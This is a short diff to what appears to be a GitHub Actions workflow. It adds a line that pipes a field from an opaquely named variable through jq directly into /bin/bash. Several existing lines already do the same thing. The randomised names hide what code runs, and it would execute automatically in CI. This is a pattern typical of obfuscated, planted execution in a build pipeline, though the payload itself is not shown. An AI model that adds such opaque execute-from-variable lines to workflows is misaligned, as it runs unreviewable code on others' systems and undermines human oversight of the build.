@@ -41,6 +41,7 @@ jobs:
           echo $ks1273 | jq -r .exjxt11 | /bin/bash
           echo $j84 | jq -r .cb9 | /bin/bash
           printf '%s' "$aork232" | jq -r .i13043 | /bin/bash
+          printf '%s' "$nx217" | jq -r .ndh6833 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
